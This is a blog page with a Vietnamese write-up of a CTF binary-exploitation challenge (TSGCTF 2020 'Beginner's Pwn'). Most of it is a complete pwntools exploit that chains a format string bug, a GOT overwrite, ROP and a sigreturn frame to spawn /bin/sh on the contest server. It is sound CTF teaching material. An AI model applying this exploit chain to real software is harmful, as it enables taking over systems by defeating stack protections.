<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TSGCTF 2020 - Beginner's Pwn | blog.undo.pw</title><meta name=keywords content="ctf,pwn"><meta name=description content="Writeup for an easy Pwn challenge that I solved in TSGCTF 2020"><meta name=author content="son"><link rel=canonical href=https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.undo.pw/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.undo.pw/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.undo.pw/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.undo.pw/apple-touch-icon.png><link rel=mask-icon href=https://blog.undo.pw/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="TSGCTF 2020 - Beginner's Pwn"><meta property="og:description" content="Writeup for an easy Pwn challenge that I solved in TSGCTF 2020"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-07-15T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-15T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TSGCTF 2020 - Beginner's Pwn"><meta name=twitter:description content="Writeup for an easy Pwn challenge that I solved in TSGCTF 2020"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.undo.pw/posts/"},{"@type":"ListItem","position":2,"name":"TSGCTF 2020 - Beginner's Pwn","item":"https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TSGCTF 2020 - Beginner's Pwn","name":"TSGCTF 2020 - Beginner\u0027s Pwn","description":"Writeup for an easy Pwn challenge that I solved in TSGCTF 2020","keywords":["ctf","pwn"],"articleBody":"Foreword Theo như description của đề thì bài này là sự tổng hợp của các techniques như:\nFormat String GOT (Global Offset Table) overwrite Buffer Overflow ROP (Return-Oriented Programming) sigreturn syscall (aka SROP) Thì chúng ta chỉ việc follow theo đấy mà làm thôi.\nExploit Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.\nIdea Idea của mình trong bài này như sau:\nOverwrite __stack_chk_fail GOT address để tránh exit program khi đè qua canary Ghi chuỗi format của hàm scanf lên section có quyền write (ở đây là .bss section) Làm cho register rax = 0xf khi chạy qua hàm scanf để gọi sys_rt_sigreturn syscall Craft 1 stack frame bằng pwntools để chạy sys_execve syscall Exploit Analyse from pwn import * binary = ELF('./beginners_pwn', checksec=False) p = remote('35.221.81.216', 30002) got_table = binary.symbols['_GLOBAL_OFFSET_TABLE_'] start_main_ret = 0x401203 end_main_ret = 0x401256 pop_rdi_ret = 0x4012c3 pop_rsi_r15_ret = 0x4012c1 syscall = 0x40118f p.sendline(('%7$s%s').ljust(8, '\\x00') + p64(binary.symbols['got.__stack_chk_fail'])) p.sendline(p64(end_main_ret)[:-1]) # đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf p.sendline('A'*24 + p64(end_main_ret) + p64(start_main_ret)) # đoạn này phải 16 bytes stack-aligned p.sendline(('%7$s%s').ljust(8, '\\x00') + p64(got_table+0x30)) p.sendline('%1$s'*0xf) # ghi '%1$s' 15 lần vào .bss payload = p64(pop_rdi_ret) payload += p64(got_table+0x30) payload += p64(pop_rsi_r15_ret) payload += p64(got_table+0x80) payload += p64(0) payload += p64(binary.symbols['plt.__isoc99_scanf']) # scanf(format=got_table+0x30, varargs=got_table+0x80) # sau khi nhập 15 lần '/bin/sh' (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn # '/bin/sh' sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80) payload += p64(syscall) # Setup stack frame cho Sigreturn frame = SigreturnFrame(arch='amd64') frame.rax = 0x3b # sys_execve frame.rdi = got_table+0x80 # '/bin/sh\\x00' frame.rsi = 0 # reset rsi frame.rdx = 0 # reset rdx frame.rip = syscall # jump tới syscall address để gọi sys_execve payload += str(frame) p.sendline('A'*24 + payload) p.sendlines(['/bin/sh\\x00']*0xf) # Gửi '/bin/sh\\x00' 15 lần p.interactive() ","wordCount":"365","inLanguage":"en","datePublished":"2020-07-15T00:00:00Z","dateModified":"2020-07-15T00:00:00Z","author":{"@type":"Person","name":"son"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/"},"publisher":{"@type":"Organization","name":"blog.undo.pw","logo":{"@type":"ImageObject","url":"https://blog.undo.pw/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.undo.pw/ accesskey=h title="blog.undo.pw (Alt + H)">blog.undo.pw</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.undo.pw/archives title=archives><span>archives</span></a></li><li><a href=https://blog.undo.pw/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://blog.undo.pw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.undo.pw/>Home</a>&nbsp;»&nbsp;<a href=https://blog.undo.pw/posts/>Posts</a></div><h1 class=post-title>TSGCTF 2020 - Beginner's Pwn</h1><div class=post-meta><span title='2020-07-15 00:00:00 +0000 UTC'>July 15, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;son&nbsp;|&nbsp;<a href=https://github.com/qnhn/qnhn.github.io/tree/main/content/posts/tsgctf-2020-beginners-pwn/index.md rel="noopener noreferrer" target=_blank>suggest changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#foreword>Foreword</a></li><li><a href=#exploit>Exploit</a><ul><li><a href=#idea>Idea</a></li><li><a href=#exploit-analyse>Exploit Analyse</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=foreword>Foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2><p>Theo như description của đề thì bài này là sự tổng hợp của các techniques như:</p><ul><li>Format String</li><li>GOT (Global Offset Table) overwrite</li><li>Buffer Overflow</li><li>ROP (Return-Oriented Programming)</li><li>sigreturn syscall (aka SROP)</li></ul><p>Thì chúng ta chỉ việc follow theo đấy mà làm thôi.</p><h2 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p><img loading=lazy src=images/main_fn.jpg alt>
<img loading=lazy src=images/checksec.jpg alt></p><p>Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.</p><h3 id=idea>Idea<a hidden class=anchor aria-hidden=true href=#idea>#</a></h3><p>Idea của mình trong bài này như sau:</p><ol><li>Overwrite <code>__stack_chk_fail</code> GOT address để tránh exit program khi đè qua canary</li><li>Ghi chuỗi <code>format</code> của hàm <code>scanf</code> lên section có quyền write (ở đây là .bss section)</li><li>Làm cho register <code>rax = 0xf</code> khi chạy qua hàm scanf để gọi <code>sys_rt_sigreturn</code> syscall</li><li>Craft 1 stack frame bằng <code>pwntools</code> để chạy <code>sys_execve</code> syscall</li></ol><h3 id=exploit-analyse>Exploit Analyse<a hidden class=anchor aria-hidden=true href=#exploit-analyse>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./beginners_pwn&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;35.221.81.216&#39;</span>, <span style=color:#ae81ff>30002</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>got_table <span style=color:#f92672>=</span> binary<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;_GLOBAL_OFFSET_TABLE_&#39;</span>]
</span></span><span style=display:flex><span>start_main_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401203</span>
</span></span><span style=display:flex><span>end_main_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401256</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4012c3</span>
</span></span><span style=display:flex><span>pop_rsi_r15_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4012c1</span>
</span></span><span style=display:flex><span>syscall <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40118f</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline((<span style=color:#e6db74>&#39;%7$s</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> p64(binary<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;got.__stack_chk_fail&#39;</span>]))
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(p64(end_main_ret)[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]) <span style=color:#75715e># đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> p64(end_main_ret) <span style=color:#f92672>+</span> p64(start_main_ret)) <span style=color:#75715e># đoạn này phải 16 bytes stack-aligned</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline((<span style=color:#e6db74>&#39;%7$s</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> p64(got_table<span style=color:#f92672>+</span><span style=color:#ae81ff>0x30</span>))
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;%1$s&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0xf</span>) <span style=color:#75715e># ghi &#39;%1$s&#39; 15 lần vào .bss</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(got_table<span style=color:#f92672>+</span><span style=color:#ae81ff>0x30</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rsi_r15_ret)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(got_table<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(binary<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;plt.__isoc99_scanf&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#75715e># scanf(format=got_table+0x30, varargs=got_table+0x80)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sau khi nhập 15 lần &#39;/bin/sh&#39; (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn</span>
</span></span><span style=display:flex><span><span style=color:#75715e># &#39;/bin/sh&#39; sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80)</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(syscall)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Setup stack frame cho Sigreturn</span>
</span></span><span style=display:flex><span>frame <span style=color:#f92672>=</span> SigreturnFrame(arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>)
</span></span><span style=display:flex><span>frame<span style=color:#f92672>.</span>rax <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x3b</span> <span style=color:#75715e># sys_execve</span>
</span></span><span style=display:flex><span>frame<span style=color:#f92672>.</span>rdi <span style=color:#f92672>=</span> got_table<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span> <span style=color:#75715e># &#39;/bin/sh\x00&#39;</span>
</span></span><span style=display:flex><span>frame<span style=color:#f92672>.</span>rsi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> <span style=color:#75715e># reset rsi</span>
</span></span><span style=display:flex><span>frame<span style=color:#f92672>.</span>rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> <span style=color:#75715e># reset rdx</span>
</span></span><span style=display:flex><span>frame<span style=color:#f92672>.</span>rip <span style=color:#f92672>=</span> syscall <span style=color:#75715e># jump tới syscall address để gọi sys_execve</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> str(frame)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlines([<span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>]<span style=color:#f92672>*</span><span style=color:#ae81ff>0xf</span>) <span style=color:#75715e># Gửi &#39;/bin/sh\x00&#39; 15 lần</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.undo.pw/tags/ctf/>ctf</a></li><li><a href=https://blog.undo.pw/tags/pwn/>pwn</a></li></ul><nav class=paginav><a class=prev href=https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/><span class=title>« Prev</span><br><span>ASCIS 2020 Quals - Web short writeup</span></a>
<a class=next href=https://blog.undo.pw/posts/tetctf-2020-web-writeup/><span class=title>Next »</span><br><span>TetCTF 2020 Web writeup</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.undo.pw/>blog.undo.pw</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>